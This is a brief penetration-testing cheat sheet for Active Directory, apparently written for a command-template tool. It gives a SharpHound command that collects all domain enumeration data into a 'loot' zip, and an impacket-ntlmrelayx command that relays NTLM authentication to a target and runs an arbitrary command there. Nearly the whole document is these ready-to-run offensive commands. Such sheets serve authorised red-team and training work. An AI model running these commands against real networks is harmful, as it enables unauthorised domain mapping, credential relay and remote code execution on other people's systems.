# Active Directory

% bloodhound, Active directory enumeration

## SharpHound - run SharpHound collector
#platform/windows #target/remote #cat/4Kp3n
```
.\SharpHound.exe --collectionmethods All -d <domain> --zipfilename <filename|loot.zip>
```

## impacket - NTLM relay
#platform/windows #target/serve #cat/4Kp3n
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <ip_local> -c <command>
```